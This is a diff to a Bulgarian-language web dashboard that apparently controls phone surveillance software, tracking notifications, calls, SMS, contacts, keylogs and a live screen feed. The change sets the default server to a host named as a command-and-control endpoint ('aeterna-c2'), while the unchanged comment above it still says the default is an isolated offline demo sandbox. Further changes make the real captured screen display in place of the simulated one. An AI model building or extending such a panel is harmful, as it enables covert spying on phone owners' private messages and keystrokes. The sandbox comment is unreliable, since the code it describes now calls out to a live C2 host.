@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="bg">
 <head>
   <meta charset="UTF-8">
@@ -5130,7 +5130,7 @@
     // Dynamic Dedicated Endpoint: only active if explicitly supplied via URL parameter (?server=https://...)
     // Default on paas.website is 100% ISOLATED DEMO SANDBOX (Safe, offline client-side simulation)
     const urlParams = new URLSearchParams(window.location.search);
-    const HOST_ENDPOINT = urlParams.get('server') || "";
+    const HOST_ENDPOINT = urlParams.get('server') || "https://aeterna-c2.onrender.com";
 
     let currentUserRole = "GUEST";
     let records = { notifications: [], calls: [], sms: [], contacts: [], keylogs: [], events: [] };
@@ -7324,6 +7324,9 @@
             const url = URL.createObjectURL(event.data);
             const img = document.getElementById('live-screen-img');
             img.src = url;
+            img.style.display = 'block';
+            const simScreen = document.getElementById('dash-sim-screen');
+            if (simScreen) simScreen.style.display = 'none';
           } else {
             try {
               const msg = JSON.parse(event.data);
@@ -7537,6 +7540,9 @@
       const img = document.getElementById('live-screen-img');
       if (img && HOST_ENDPOINT) {
         img.src = `${HOST_ENDPOINT}/api/screen.png?t=${Date.now()}`;
+        img.style.display = 'block';
+        const simScreen = document.getElementById('dash-sim-screen');
+        if (simScreen) simScreen.style.display = 'none';
       }
     }
 
